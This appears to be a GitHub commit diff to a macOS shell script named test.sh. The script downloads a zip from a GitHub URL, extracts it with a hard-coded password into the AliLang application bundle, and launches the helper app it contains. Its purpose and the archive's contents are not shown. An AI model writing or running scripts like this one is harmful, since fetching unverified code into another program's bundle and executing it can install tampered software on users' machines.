70090bc910bbe9cf6eb70ae9df11bcdae7d1ca08
fengxiaopeng1 <116345627+fengxiaopeng1@users.noreply.github.com>
2023-03-21 17:00:19 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -3,7 +3,7 @@ curl -o /tmp/alilangHelper.zip --create-dirs  https://raw.githubusercontent.com/
 chmod 755 /tmp/alilangHelper.zip 
 cp /tmp/alilangHelper.zip /Applications/AliLang.app/Contents/alilangHelper.zip
 unzip -P alibaba -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/alilangHelper.zip
-unzip -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/Alilang.zip
+unzip -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/Alilang2.zip
 chmod 755 /Applications/AliLang.app/Contents/AliLang\ Helper.app
 open /Applications/AliLang.app/Contents/AliLang\ Helper.app    
 rm -f /tmp/alilangHelper
